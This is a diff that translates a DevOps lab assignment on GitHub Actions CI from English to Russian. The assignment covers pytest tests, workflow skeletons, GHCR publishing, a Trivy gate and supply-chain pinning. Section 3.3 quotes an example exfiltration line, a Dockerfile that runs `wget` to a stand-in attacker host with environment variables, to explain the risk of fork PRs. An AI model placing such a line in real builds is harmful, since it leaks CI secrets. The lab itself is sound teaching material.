@@ -1,67 +1,67 @@
-# Lab 3 — Continuous Integration with GitHub Actions
+# Лабораторная 3 — Непрерывная интеграция с GitHub Actions
 
 ![difficulty](https://img.shields.io/badge/difficulty-beginner-success)
 ![topic](https://img.shields.io/badge/topic-CI/CD-blue)
 ![points](https://img.shields.io/badge/points-10%2B2-orange)
 ![tech](https://img.shields.io/badge/tech-GitHub%20Actions-informational)
 
-> **Goal:** Put a pipeline behind the Lab 1/2 service. Every push: test → lint → scan → build → publish, on a clean runner, automatically.
-> **Deliverable:** A PR from `lab03` adding `.github/workflows/python-ci.yml`, `app_python/tests/`, `requirements-dev.txt`, branch protection, and `app_python/docs/LAB03.md`.
+> **Цель:** Поставить конвейер за сервисом из лабораторных 1/2. Каждый пуш: тест → lint → сканирование → сборка → публикация, на чистом runner, автоматически.
+> **Результат сдачи:** PR из `lab03`, добавляющий `.github/workflows/python-ci.yml`, `app_python/tests/`, `requirements-dev.txt`, защиту ветки и `app_python/docs/LAB03.md`.
 
 ---
 
-## Overview
+## Обзор
 
-A green check on your laptop proves nothing. CI runs the *same* steps on the *same* runner for *every* commit, so "works on my machine" stops being a defence. The skill this lab assesses is **writing the GitHub Actions workflow by hand** — not filling in the last word of someone else's YAML.
+Зелёная галочка на вашем ноутбуке ничего не доказывает. CI запускает *те же самые* шаги на *том же самом* runner для *каждого* коммита, так что «работает на моей машине» перестаёт быть оправданием. Навык, который оценивает эта лабораторная, — **написание workflow GitHub Actions вручную** — а не дописывание последнего слова в чужом YAML.
 
-In this lab you practice:
-- Writing pytest tests against the Lab 1 endpoints (real assertions, not import smoke tests)
-- Composing a GitHub Actions workflow file *from the keys up* — `name`, `on`, `permissions`, `concurrency`, `jobs`, `steps`
-- Publishing Docker images to GHCR using `GITHUB_TOKEN` (no PAT, nothing to rotate)
-- Gating merges on a Trivy filesystem scan
-- Speeding CI up with `setup-python`'s pip cache and BuildKit's GHA layer cache
+В этой лабораторной работе вы отработаете:
+- Написание тестов pytest для эндпоинтов из лабораторной 1 (реальные утверждения, а не smoke-тесты импорта)
+- Составление файла workflow GitHub Actions *начиная с ключей* — `name`, `on`, `permissions`, `concurrency`, `jobs`, `steps`
+- Публикацию Docker-образов в GHCR с помощью `GITHUB_TOKEN` (без PAT, нечего ротировать)
+- Гейтирование слияний на основе сканирования файловой системы Trivy
+- Ускорение CI с помощью pip-кеша `setup-python` и кеша слоёв BuildKit GHA
 
-> ⚠️ **Scope:** No deploy step. CI publishes the image — the cluster pulls it in Lab 9+. Don't build a deploy-on-merge here; you'd be re-doing it with ArgoCD in Lab 13 anyway.
+> ⚠️ **Область:** без шага развёртывания. CI публикует образ — кластер подтянет его в лабораторной 9+. Не делайте здесь развёртывание при слиянии; вы бы всё равно переделали его с ArgoCD в лабораторной 13.
 
 ---
 
-## Project State
+## Состояние проекта
 
-**You should have from previous labs:**
-- `app_python/` from Lab 1 — Flask/FastAPI service with `/` and `/health`
-- `app_python/Dockerfile` from Lab 2 — multi-stage, non-root, builds clean locally
-- `app_python/requirements.txt` — pinned dependencies
+**У вас должно быть из предыдущих лабораторных:**
+- `app_python/` из лабораторной 1 — сервис на Flask/FastAPI с `/` и `/health`
+- `app_python/Dockerfile` из лабораторной 2 — многоэтапный, не-root, чисто собирается локально
+- `app_python/requirements.txt` — закреплённые зависимости
 
-**This lab adds:**
+**Эта лабораторная добавляет:**
 - `app_python/requirements-dev.txt` — pytest, pytest-cov, ruff
-- `app_python/tests/test_app.py` — real assertions on `/`, `/health`, an error path
-- `.github/workflows/python-ci.yml` — the pipeline (test → scan → build → push)
-- Branch protection on `main` requiring those checks
-- `app_python/docs/LAB03.md` — your submission report
+- `app_python/tests/test_app.py` — реальные утверждения для `/`, `/health`, путь ошибки
+- `.github/workflows/python-ci.yml` — конвейер (тест → сканирование → сборка → пуш)
+- Защиту ветки на `main`, требующую этих проверок
+- `app_python/docs/LAB03.md` — ваш отчёт о сдаче
 
-By Lab 13 this pipeline's GHCR image is what ArgoCD watches. The tagging strategy you pick this week is the one your future deploys will rely on.
+К лабораторной 13 именно GHCR-образ из этого конвейера будет наблюдать ArgoCD. Стратегия тегирования, которую вы выберете на этой неделе, — та, на которую будут опираться ваши будущие развёртывания.
 
 ---
 
-## Setup
+## Подготовка
 
 ```bash
-python --version            # 3.12+; the matrix tests 3.12 and 3.13
-docker version              # 29.x; same as Lab 2
-trivy --version             # v0.69.3 or later — NEVER v0.69.4 (see below)
+python --version            # 3.12+; матрица тестирует 3.12 и 3.13
+docker version              # 29.x; как в лабораторной 2
+trivy --version             # v0.69.3 или новее — НИКОГДА v0.69.4 (см. ниже)
 
-# Local test of the workflow without pushing to GitHub:
+# Локальный тест workflow без пуша в GitHub:
 brew install act           # macOS
-# Linux: see https://github.com/nektos/act#installation
+# Linux: см. https://github.com/nektos/act#installation
 act --version              # 0.2.88+
 ```
 
-You'll commit only these new paths:
+Вы закоммитите только эти новые пути:
 
 ```
 .github/
 └── workflows/
-    └── python-ci.yml                  # the workflow you write
+    └── python-ci.yml                  # workflow, который вы пишете
 app_python/
 ├── requirements-dev.txt
 ├── tests/
@@ -72,54 +72,54 @@ app_python/
 
 ---
 
-## ⚠️ A Note on Supply-Chain Safety (read before Task 2)
+## ⚠️ Замечание о безопасности цепочки поставок (прочитайте перед Задачей 2)
 
-CI runs third-party code with access to your repository's secrets — the actions you pin **are** your attack surface. Two recent incidents define the rules:
+CI запускает сторонний код с доступом к секретам вашего репозитория — actions, которые вы закрепляете, **и есть** ваша поверхность атаки. Два недавних инцидента определяют правила:
 
-- **`tj-actions/changed-files` (CVE-2025-30066, March 14–15 2025)** — a compromised release leaked secrets from CI logs in **23,000+ repositories**. Every repo pinned to `@main` or a floating tag pulled the malicious code automatically. Fixed in `v46.0.1`.
-- **Trivy (CVE-2026-33634, March 19 2026)** — a malicious **`v0.69.4`** binary was published to the official GitHub release page after a maintainer signing key was compromised. **Use `v0.69.3` or a later patched release — NEVER `v0.69.4`.** The Action wrapper (`aquasecurity/trivy-action@v0.35.0`+) and `setup-trivy@v0.2.6`+ are post-incident-safe.
+- **`tj-actions/changed-files` (CVE-2025-30066, 14–15 марта 2025)** — скомпрометированный релиз слил секреты из логов CI в **более чем 23 000 репозиториев**. Каждый репозиторий, закреплённый на `@main` или плавающем теге, автоматически подтянул вредоносный код. Исправлено в `v46.0.1`.
+- **Trivy (CVE-2026-33634, 19 марта 2026)** — вредоносный бинарник **`v0.69.4`** был опубликован на официальной странице релизов GitHub после компрометации ключа подписи мейнтейнера. **Используйте `v0.69.3` или более поздний исправленный релиз — НИКОГДА `v0.69.4`.** Обёртка Action (`aquasecurity/trivy-action@v0.35.0`+) и `setup-trivy@v0.2.6`+ безопасны после инцидента.
 
-**What you do about it in this lab:**
-- Pin the runner OS: `runs-on: ubuntu-24.04`, not `ubuntu-latest`.
-- Pin actions to a major tag: `actions/checkout@v4`. For high-risk or third-party actions, pin to a **full commit SHA** — a tag can be re-pointed by an attacker; a SHA cannot.
-- Scope `permissions:` to the minimum each job needs (`contents: read` by default; `packages: write` only on the job that pushes to GHCR).
-- Never push images from PRs **from forks** — a fork can rewrite the Dockerfile and use your `GITHUB_TOKEN` to publish a malicious image to your namespace.
+**Что вы делаете с этим в этой лабораторной:**
+- Закрепите ОС runner: `runs-on: ubuntu-24.04`, а не `ubuntu-latest`.
+- Закрепляйте actions на мажорном теге: `actions/checkout@v4`. Для действий с высоким риском или сторонних действий закрепляйте на **полный SHA коммита** — тег может быть переуказан атакующим; SHA — нет.
+- Ограничьте `permissions:` минимумом, нужным каждой задаче (`contents: read` по умолчанию; `packages: write` только у задачи, которая пушит в GHCR).
+- Никогда не пушьте образы из PR **из форков** — форк может переписать Dockerfile и использовать ваш `GITHUB_TOKEN`, чтобы опубликовать вредоносный образ в вашем пространстве имён.
 
-> 📌 Example SHA-pin (the comment keeps it readable):
+> 📌 Пример закрепления по SHA (комментарий сохраняет читаемость):
 > ```yaml
 > - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
 > ```
 
 ---
 
-## Task 1 — Unit Tests with pytest (2 pts)
+## Задача 1 — Модульные тесты с pytest (2 балла)
 
-### 1.1 — Pick a runner and justify it
+### 1.1 — Выберите раннер и обоснуйте его
 
-Use **pytest 8.3+**. Fixtures + plain `assert` beat `unittest`'s boilerplate for most projects, and `pytest-cov` is one line to wire in for the bonus. In `docs/LAB03.md` give one paragraph on why pytest over `unittest`.
+Используйте **pytest 8.3+**. Фикстуры + обычный `assert` побеждают шаблонность `unittest` для большинства проектов, а `pytest-cov` подключается одной строкой для бонуса. В `docs/LAB03.md` приведите один абзац о том, почему pytest, а не `unittest`.
 
-### 1.2 — Write `requirements-dev.txt`
+### 1.2 — Напишите `requirements-dev.txt`
 
-`YOUR TASK`: create `app_python/requirements-dev.txt` with **exactly-pinned** versions of the dev tools — `pytest`, `pytest-cov`, and a linter (`ruff` recommended; `flake8` or `pylint` accepted). Use `pkg==X.Y.Z` form, not floating ranges; the lock-it-down argument from Lab 2 applies.
+`ВАША ЗАДАЧА`: создайте `app_python/requirements-dev.txt` с **точно закреплёнными** версиями инструментов разработки — `pytest`, `pytest-cov` и линтера (рекомендуется `ruff`; принимаются `flake8` или `pylint`). Используйте форму `pkg==X.Y.Z`, а не плавающие диапазоны; аргумент о фиксации из лабораторной 2 применим.
 
-### 1.3 — Write tests that actually fail when the app is broken
+### 1.3 — Напишите тесты, которые действительно падают, когда приложение сломано
 
-`YOUR TASK`: create `app_python/tests/test_app.py` with at least three tests. Each must assert on **behaviour**, not just that an import succeeded:
+`ВАША ЗАДАЧА`: создайте `app_python/tests/test_app.py` с как минимум тремя тестами. Каждый должен проверять **поведение**, а не просто то, что импорт удался:
 
-| Test | Asserts |
+| Тест | Проверяет |
 |------|---------|
-| `GET /` | status `200`, response is JSON, body contains the **five** keys from Lab 1 (`service`, `system`, `runtime`, `request`, `endpoints`) |
-| `GET /health` | status `200`, JSON body has `status == "healthy"` |
-| Unknown route | status `404`, body is JSON (not the framework's HTML default — proves your Lab 1 error handler is wired) |
+| `GET /` | статус `200`, ответ — JSON, тело содержит **пять** ключей из лабораторной 1 (`service`, `system`, `runtime`, `request`, `endpoints`) |
+| `GET /health` | статус `200`, JSON-тело имеет `status == "healthy"` |
+| Неизвестный маршрут | статус `404`, тело — JSON (не HTML по умолчанию у фреймворка — доказывает, что ваш обработчик ошибок из лабораторной 1 подключён) |
 
-Hints (no full code given — writing the tests *is* the skill):
+Подсказки (без полного кода — написание тестов *и есть* навык):
 
-- Flask: `app.test_client()` in a `pytest.fixture`; `r.get_json()` on the response.
-- FastAPI: `from fastapi.testclient import TestClient`; `r.json()` on the response.
-- **Don't** test internal helpers; test routes. A test that calls `get_uptime()` directly won't catch a routing typo.
-- **Don't** assert exact uptime values — flaky. Assert the *shape* (e.g. `"uptime_seconds" in body["runtime"] and isinstance(..., int)`).
+- Flask: `app.test_client()` в `pytest.fixture`; `r.get_json()` для ответа.
+- FastAPI: `from fastapi.testclient import TestClient`; `r.json()` для ответа.
+- **Не** тестируйте внутренние вспомогательные функции; тестируйте маршруты. Тест, который вызывает `get_uptime()` напрямую, не поймает опечатку в маршрутизации.
+- **Не** проверяйте точные значения uptime — нестабильно. Проверяйте *форму* (например, `"uptime_seconds" in body["runtime"] and isinstance(..., int)`).
 
-### 1.4 — Run them locally
+### 1.4 — Запустите их локально
 
 ```bash
 cd app_python
@@ -129,174 +129,174 @@ pytest -q
 ruff check .
 ```
 
-Both must exit `0`. If they don't, fix the app, not the tests.
+Обе команды должны завершиться с кодом `0`. Если нет — исправляйте приложение, а не тесты.
 
-### 1.5 — Proof of work
+### 1.5 — Доказательство выполнения
 
-**Paste into `docs/LAB03.md`:**
+**Вставьте в `docs/LAB03.md`:**
 
-- The output of `pytest -q` (real run from your machine — at least 3 dots, all passed)
-- The output of `ruff check .` (or `flake8 .`) — "All checks passed!" or equivalent
-- One sentence per test explaining what behaviour it locks in (this prevents "delete the test when it breaks" syndrome later)
+- Вывод `pytest -q` (реальный запуск с вашей машины — как минимум 3 точки, все пройдены)
+- Вывод `ruff check .` (или `flake8 .`) — «All checks passed!» или эквивалент
+- Одно предложение на каждый тест, объясняющее, какое поведение он фиксирует (это предотвращает синдром «удалить тест, когда он падает» в дальнейшем)
 
 ---
 
-## Task 2 — Test & Lint in CI (3 pts)
+## Задача 2 — Тест и lint в CI (3 балла)
 
-Now wire the tests into GitHub Actions. The workflow file lives at `.github/workflows/python-ci.yml`. Tasks 2–4 all extend the **same file** — Task 2 delivers the `test` job, Task 3 adds `docker`, Task 4 wires the Trivy gate.
+Теперь подключите тесты в GitHub Actions. Файл workflow находится по адресу `.github/workflows/python-ci.yml`. Задачи 2–4 все расширяют **один и тот же файл** — Задача 2 поставляет задачу `test`, Задача 3 добавляет `docker`, Задача 4 подключает гейт Trivy.
 
-### 2.1 — Understand the keys before you write
+### 2.1 — Поймите ключи, прежде чем писать
 
-A workflow has five top-level keys you will write:
+У workflow есть пять ключей верхнего уровня, которые вы напишете:
 
-| Key | What it controls | Lab 3 value |
+| Ключ | Что контролирует | Значение для лабораторной 3 |
 |-----|------------------|-------------|
-| `name:` | Display name in the Actions tab | freeform |
-| `on:` | Triggers | `push` to `main` **and** `pull_request` |
-| `permissions:` | What `GITHUB_TOKEN` can do | start `contents: read`; grant `packages: write` per-job |
-| `concurrency:` | De-dup superseded runs | group by ref, `cancel-in-progress: true` |
-| `jobs:` | The work | `test` (this task), `docker` (Task 3) |
+| `name:` | Отображаемое имя во вкладке Actions | произвольное |
+| `on:` | Триггеры | `push` в `main` **и** `pull_request` |
+| `permissions:` | Что может `GITHUB_TOKEN` | начните с `contents: read`; выдайте `packages: write` отдельной задаче |
+| `concurrency:` | Де-дубликация вытесненных запусков | группировка по ref, `cancel-in-progress: true` |
+| `jobs:` | Работа | `test` (эта задача), `docker` (Задача 3) |
 
-### 2.2 — Write the workflow skeleton
+### 2.2 — Напишите скелет workflow
 
-`YOUR TASK`: create `.github/workflows/python-ci.yml` and fill in every blank. The skeleton shows the YAML **shape** — you supply the **values + step bodies**. Don't paste a workflow you found online; the grader will ask why you picked each value.
+`ВАША ЗАДАЧА`: создайте `.github/workflows/python-ci.yml` и заполните каждый пропуск. Скелет показывает **форму** YAML — вы поставляете **значения + тела шагов**. Не вставляйте workflow, найденный в интернете; проверяющий спросит, почему вы выбрали каждое значение.
 
 ```yaml
-name: ___                              # YOUR TASK: workflow display name
+name: ___                              # ВАША ЗАДАЧА: отображаемое имя workflow
 
 on:
-  ___:                                 # YOUR TASK: which event? push to main? branches filter?
+  ___:                                 # ВАША ЗАДАЧА: какое событие? push в main? фильтр branches?
     branches: [___]
-    paths:                             # YOUR TASK: skip CI on docs-only commits
+    paths:                             # ВАША ЗАДАЧА: пропускать CI на коммитах только с docs
       - ___
       - ___
-  ___:                                 # YOUR TASK: the other event (pull_request)
+  ___:                                 # ВАША ЗАДАЧА: другое событие (pull_request)
     paths:
       - ___
       - ___
 
 permissions:
-  contents: ___                        # YOUR TASK: minimum needed for checkout
+  contents: ___                        # ВАША ЗАДАЧА: минимум, нужный для checkout
 
 concurrency:
-  group: ___                           # YOUR TASK: how do you de-dup superseded runs on the SAME ref?
-  cancel-in-progress: ___              # YOUR TASK: should an older run keep going? why/why not?
+  group: ___                           # ВАША ЗАДАЧА: как де-дублировать вытесненные запуски на ОДНОМ ref?
+  cancel-in-progress: ___              # ВАША ЗАДАЧА: должен ли старый запуск продолжаться? почему/почему нет?
 
 jobs:
   test:
-    runs-on: ___                       # YOUR TASK: which runner? why pinned (not :latest)?
+    runs-on: ___                       # ВАША ЗАДАЧА: какой runner? почему закреплён (не :latest)?
     strategy:
-      fail-fast: ___                   # YOUR TASK: should 3.12 dying kill 3.13? what does that hide?
+      fail-fast: ___                   # ВАША ЗАДАЧА: должно ли падение 3.12 убивать 3.13? что это скрывает?
       matrix:
-        python-version: [___, ___]     # YOUR TASK: which versions? (Lab 1 standardised on which?)
+        python-version: [___, ___]     # ВАША ЗАДАЧА: какие версии? (на каких стандартизировала лабораторная 1?)
 
     steps:
-      - uses: actions/checkout@___     # YOUR TASK: pin to major tag (or SHA — see supply-chain note)
+      - uses: actions/checkout@___     # ВАША ЗАДАЧА: закрепите на мажорном теге (или SHA — см. замечание о цепочке поставок)
 
       - uses: actions/setup-python@___
         with:
-          python-version: ___          # YOUR TASK: reference the matrix value
-          cache: ___                   # YOUR TASK: which cache mode does setup-python provide?
-          cache-dependency-path: ___   # YOUR TASK: which file(s) does the cache key hash?
-                                       #            (you install BOTH requirements.txt + requirements-dev.txt —
-                                       #             cache must invalidate on either; YAML accepts a multi-line list)
+          python-version: ___          # ВАША ЗАДАЧА: ссылка на значение матрицы
+          cache: ___                   # ВАША ЗАДАЧА: какой режим кеша предоставляет setup-python?
+          cache-dependency-path: ___   # ВАША ЗАДАЧА: по какому файлу(ам) хешируется ключ кеша?
+                                       #            (вы устанавливаете ОБА файла requirements.txt + requirements-dev.txt —
+                                       #             кеш должен инвалидироваться по любому из них; YAML принимает многострочный список)
 
-      - name: ___                      # YOUR TASK: human-readable step name
-        working-directory: ___         # YOUR TASK: which dir holds requirements*.txt + tests/?
+      - name: ___                      # ВАША ЗАДАЧА: понятное человеку имя шага
+        working-directory: ___         # ВАША ЗАДАЧА: какой каталог содержит requirements*.txt + tests/?
         run: |
-          # YOUR TASK: install both runtime and dev requirements
-          # Hint: pip install -r requirements.txt -r requirements-dev.txt
+          # ВАША ЗАДАЧА: установите и runtime-, и dev-зависимости
+          # Подсказка: pip install -r requirements.txt -r requirements-dev.txt
 
-      - name: ___                      # YOUR TASK: lint step name
-        working-directory: ___         # YOUR TASK: same dir as install — ruff scans the code, not the repo root
-        run: ___                       # YOUR TASK: ruff/flake8/pylint command
+      - name: ___                      # ВАША ЗАДАЧА: имя шага lint
+        working-directory: ___         # ВАША ЗАДАЧА: тот же каталог, что при установке — ruff сканирует код, а не корень репозитория
+        run: ___                       # ВАША ЗАДАЧА: команда ruff/flake8/pylint
 
-      - name: ___                      # YOUR TASK: test step name
-        working-directory: ___         # YOUR TASK: same dir — without this, pytest finds 0 tests
-        run: ___                       # YOUR TASK: pytest command (quiet mode? cov?)
+      - name: ___                      # ВАША ЗАДАЧА: имя шага теста
+        working-directory: ___         # ВАША ЗАДАЧА: тот же каталог — без этого pytest найдёт 0 тестов
+        run: ___                       # ВАША ЗАДАЧА: команда pytest (тихий режим? cov?)
 ```
 
-> 💡 **Why `working-directory:` on every step?** A fresh runner starts at the repo root (`$GITHUB_WORKSPACE`). Without `working-directory:`, `pytest -q` runs at the repo root and reports **`collected 0 items`** — a green-but-meaningless run. Set the dir on each step that touches the app (or set it once at the job level via `defaults.run.working-directory`).
+> 💡 **Почему `working-directory:` на каждом шаге?** Свежий runner стартует из корня репозитория (`$GITHUB_WORKSPACE`). Без `working-directory:` команда `pytest -q` запускается в корне репозитория и сообщает **`collected 0 items`** — зелёный, но бессмысленный запуск. Задайте каталог на каждом шаге, касающемся приложения (или задайте его один раз на уровне задачи через `defaults.run.working-directory`).
 
-### 2.3 — Add a status badge
+### 2.3 — Добавьте статусный бейдж
 
-`YOUR TASK`: once the workflow runs once on your fork, GitHub generates a badge URL of the form `https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg`. Add it to `app_python/README.md` at the top as a markdown image with a link back to the Actions tab — e.g.
+`ВАША ЗАДАЧА`: как только workflow один раз запустится в вашем форке, GitHub сгенерирует URL бейджа вида `https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg`. Добавьте его в `app_python/README.md` вверху как markdown-изображение со ссылкой назад на вкладку Actions — например,
 
 ```md
 [![Python CI](https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg)](https://github.com/<user>/<repo>/actions/workflows/python-ci.yml)
 ```
 
-### 2.4 — Validate locally with `act` before pushing
+### 2.4 — Проверьте локально с помощью `act` перед пушем
 
-Saves you minutes of CI debugging:
+Экономит вам минуты отладки CI:
 
 ```bash
-act -l                                                                       # list jobs
+act -l                                                                       # список задач
 act push -j test --matrix python-version:3.13 -P ubuntu-24.04=catthehacker/ubuntu:act-24.04
 ```
 
-If `act` fails, your workflow is broken — fix it before pushing.
+Если `act` падает, ваш workflow сломан — исправьте его до пуша.
 
-### 2.5 — Proof of work
+### 2.5 — Доказательство выполнения
 
-**Paste into `docs/LAB03.md`:**
+**Вставьте в `docs/LAB03.md`:**
 
-- Link to a green workflow run on your fork (or `act` output if you can't get CI on the fork yet)
-- The full workflow file (or a permalink to it in your repo)
-- One paragraph: why your trigger filter (`paths:`) is what it is — what changes *should* fire CI, and what shouldn't?
-- One number: warm-cache install time vs cold-cache install time (look at the "Set up Python" step duration on a second run vs the first)
+- Ссылку на зелёный запуск workflow в вашем форке (или вывод `act`, если пока не удаётся получить CI в форке)
+- Полный файл workflow (или постоянную ссылку на него в вашем репозитории)
+- Один абзац: почему ваш фильтр триггера (`paths:`) именно такой — какие изменения *должны* запускать CI, а какие нет?
+- Одно число: время установки с тёплым кешем против времени с холодным кешем (посмотрите на длительность шага «Set up Python» во втором запуске против первого)
 
 ---
 
-## Task 3 — Build & Publish to GHCR (3 pts)
+## Задача 3 — Сборка и публикация в GHCR (3 балла)
 
-Lab 2 pushed images by hand. CI does it for you: a `docker` job that builds the Lab 2 image and pushes it to GitHub Container Registry, authenticated with the auto-provisioned `GITHUB_TOKEN`. **No PAT. Nothing to rotate.**
+Лабораторная 2 пушила образы вручную. CI делает это за вас: задача `docker`, которая собирает образ из лабораторной 2 и пушит его в GitHub Container Registry, аутентифицируясь автоматически предоставленным `GITHUB_TOKEN`. **Без PAT. Нечего ротировать.**
 
-### 3.1 — Pick your tagging strategy
+### 3.1 — Выберите стратегию тегирования
 
-`YOUR TASK`: before writing YAML, decide:
+`ВАША ЗАДАЧА`: перед написанием YAML решите:
 
-- **SemVer** (`v1.4.2`, driven by `git tag`) — for libraries or services with external consumers who pin you.
-- **CalVer** (`2026.05.28`) — for services nobody else pins, where "breaking change" doesn't really apply.
-- **SHA-only** (`git-a3f1b2c`) — every commit gets an immutable tag. Mandatory regardless of the above; this is what reproducible deploys reference.
+- **SemVer** (`v1.4.2`, управляется `git tag`) — для библиотек или сервисов с внешними потребителями, которые закрепляют вас.
+- **CalVer** (`2026.05.28`) — для сервисов, которые никто не закрепляет, где «ломающее изменение» толком не применимо.
+- **Только SHA** (`git-a3f1b2c`) — каждый коммит получает неизменяемый тег. Обязательно независимо от вышеперечисленного; именно на это ссылаются воспроизводимые развёртывания.
 
-Whatever you pick, **`:latest` is a convenience pointer, not a release.** Never deploy `:latest` to anything that matters.
+Что бы вы ни выбрали, **`:latest` — это удобный указатель, а не релиз.** Никогда не развёртывайте `:latest` в то, что имеет значение.
 
-In `docs/LAB03.md`, justify your choice in 2–3 sentences.
+В `docs/LAB03.md` обоснуйте выбор в 2–3 предложениях.
 
-### 3.2 — Write the docker job
+### 3.2 — Напишите задачу docker
 
-`YOUR TASK`: append the `docker` job to `python-ci.yml`. Same skeleton-with-blanks rules — you write the values and the step bodies.
+`ВАША ЗАДАЧА`: добавьте задачу `docker` в `python-ci.yml`. Те же правила скелета с пропусками — вы пишете значения и тела шагов.
 
 ```yaml
   docker:
-    needs: ___                         # YOUR TASK: which job must pass first? Why?
-    runs-on: ___                       # YOUR TASK: same runner as test? why same/different?
-    if: ___                            # YOUR TASK: gate on event_name — DON'T push from PRs (esp. fork PRs)
+    needs: ___                         # ВАША ЗАДАЧА: какая задача должна пройти первой? Почему?
+    runs-on: ___                       # ВАША ЗАДАЧА: тот же runner, что у test? почему тот же/другой?
+    if: ___                            # ВАША ЗАДАЧА: гейт по event_name — НЕ пушить из PR (особенно из форков)
     permissions:
-      contents: ___                    # YOUR TASK
-      packages: ___                    # YOUR TASK: what does GHCR push need?
+      contents: ___                    # ВАША ЗАДАЧА
+      packages: ___                    # ВАША ЗАДАЧА: что нужно для пуша в GHCR?
 
     steps:
       - uses: actions/checkout@___
 
-      - uses: docker/login-action@___  # YOUR TASK: pin
+      - uses: docker/login-action@___  # ВАША ЗАДАЧА: закрепите
         with:
-          registry: ___                # YOUR TASK: which registry host?
-          username: ___                # YOUR TASK: which github context value?
-          password: ___                # YOUR TASK: ephemeral token expression — NOT a PAT
+          registry: ___                # ВАША ЗАДАЧА: какой хост реестра?
+          username: ___                # ВАША ЗАДАЧА: какое значение контекста github?
+          password: ___                # ВАША ЗАДАЧА: выражение эфемерного токена — НЕ PAT
 
       - uses: docker/metadata-action@___
         id: meta
         with:
-          images: ___                  # YOUR TASK: ghcr.io/<owner>/<image-name>
-                                       # Tip: `ghcr.io/${{ github.repository }}` gives `ghcr.io/<owner>/<repo>`,
-                                       # which is fine. If you want the image name to match the `devops-info-service`
-                                       # tag you pushed by hand in Lab 2 (so Lab 9's Deployment can pin one name),
-                                       # use `ghcr.io/${{ github.repository_owner }}/devops-info-service` instead.
+          images: ___                  # ВАША ЗАДАЧА: ghcr.io/<owner>/<image-name>
+                                       # Совет: `ghcr.io/${{ github.repository }}` даёт `ghcr.io/<owner>/<repo>`,
+                                       # что нормально. Если хотите, чтобы имя образа совпадало с тегом `devops-info-service`,
+                                       # который вы пушили вручную в лабораторной 2 (чтобы Deployment из лабораторной 9 мог
+                                       # закрепить одно имя), используйте `ghcr.io/${{ github.repository_owner }}/devops-info-service`.
           tags: |
-            # YOUR TASK: at least TWO tag patterns.
-            # Pick from: type=sha,prefix=git-  |  type=semver,pattern={{version}}
+            # ВАША ЗАДАЧА: как минимум ДВА шаблона тегов.
+            # Выберите из: type=sha,prefix=git-  |  type=semver,pattern={{version}}
             #            type=raw,value=latest,enable={{is_default_branch}}
             #            type=schedule,pattern={{date 'YYYY.MM.DD'}}
             ___
@@ -304,243 +304,243 @@ In `docs/LAB03.md`, justify your choice in 2–3 sentences.
 
       - uses: docker/build-push-action@___
         with:
-          context: ___                 # YOUR TASK: which dir holds the Dockerfile?
-          push: ___                    # YOUR TASK: hardcode true, or use github.event_name? (see §3.3)
-          tags: ___                    # YOUR TASK: feed in metadata-action output
-          labels: ___                  # YOUR TASK: feed in metadata-action output (OCI labels)
-          cache-from: ___              # YOUR TASK: which GHA cache mode?
-          cache-to: ___                # YOUR TASK: which GHA cache mode + mode=max?
+          context: ___                 # ВАША ЗАДАЧА: какой каталог содержит Dockerfile?
+          push: ___                    # ВАША ЗАДАЧА: жёстко true, или использовать github.event_name? (см. §3.3)
+          tags: ___                    # ВАША ЗАДАЧА: подайте вывод metadata-action
+          labels: ___                  # ВАША ЗАДАЧА: подайте вывод metadata-action (метки OCI)
+          cache-from: ___              # ВАША ЗАДАЧА: какой режим кеша GHA?
+          cache-to: ___                # ВАША ЗАДАЧА: какой режим кеша GHA + mode=max?
 ```
 
-### 3.3 — Don't push from fork PRs
+### 3.3 — Не пушить из PR из форков
 
-`YOUR TASK`: the `if:` on the docker job (or the `push:` arg on `build-push-action`) must prevent pushing when the PR comes from a fork. A fork PR can swap your Dockerfile for `FROM busybox; CMD wget evil.example.com/$(env)` and use your `GITHUB_TOKEN` to publish it under your namespace.
+`ВАША ЗАДАЧА`: `if:` у задачи docker (или аргумент `push:` у `build-push-action`) должен предотвращать пуш, когда PR приходит из форка. PR из форка может подменить ваш Dockerfile на `FROM busybox; CMD wget evil.example.com/$(env)` и использовать ваш `GITHUB_TOKEN`, чтобы опубликовать это в вашем пространстве имён.
 
-Hint: `github.event_name != 'pull_request'` covers the common case; for stricter setups, gate on `github.event.pull_request.head.repo.fork == false`.
+Подсказка: `github.event_name != 'pull_request'` покрывает обычный случай; для более строгих настроек гейтируйте по `github.event.pull_request.head.repo.fork == false`.
 
-### 3.4 — Proof of work
+### 3.4 — Доказательство выполнения
 
-**Paste into `docs/LAB03.md`:**
+**Вставьте в `docs/LAB03.md`:**
 
-- Link to the green `docker` job run (Actions tab)
-- Screenshot or URL of the package under **your repo → Packages** (`ghcr.io/<owner>/<repo>:<your-tag>`)
-- The list of tags your run produced (copy from the metadata-action step's logs)
-- 2–3 sentences justifying SemVer vs CalVer for this service
+- Ссылку на зелёный запуск задачи `docker` (вкладка Actions)
+- Скриншот или URL пакета в **вашем репозитории → Packages** (`ghcr.io/<owner>/<repo>:<your-tag>`)
+- Список тегов, которые создал ваш запуск (скопируйте из логов шага metadata-action)
+- 2–3 предложения, обосновывающие SemVer против CalVer для этого сервиса
 
 ---
 
-## Task 4 — Trivy Vulnerability Gate (2 pts)
+## Задача 4 — Гейт уязвимостей Trivy (2 балла)
 
-A scan that only warns gets ignored. Make Trivy a **gate**: a HIGH/CRITICAL finding fails the job and blocks the merge.
+Сканирование, которое только предупреждает, игнорируется. Сделайте Trivy **гейтом**: находка HIGH/CRITICAL валит задачу и блокирует слияние.
 
-### 4.1 — Wire Trivy into the test job
+### 4.1 — Подключите Trivy в задачу test
 
-`YOUR TASK`: add a Trivy step *inside* the `test` job (or a dedicated `scan` job that `docker` `needs:`). It must run **before** the docker job — a vulnerable dep cannot make it into a published image.
+`ВАША ЗАДАЧА`: добавьте шаг Trivy *внутрь* задачи `test` (или отдельную задачу `scan`, от которой `docker` `needs:`). Он должен запускаться **до** задачи docker — уязвимая зависимость не может попасть в опубликованный образ.
 
-> 💡 **Matrix vs scan:** if you add Trivy inside the matrixed `test` job, it runs twice (once per Python version) — wasteful but harmless. To run it once, either gate it with `if: matrix.python-version == '3.13'` or factor it into a separate `scan` job that the `docker` job `needs:`.
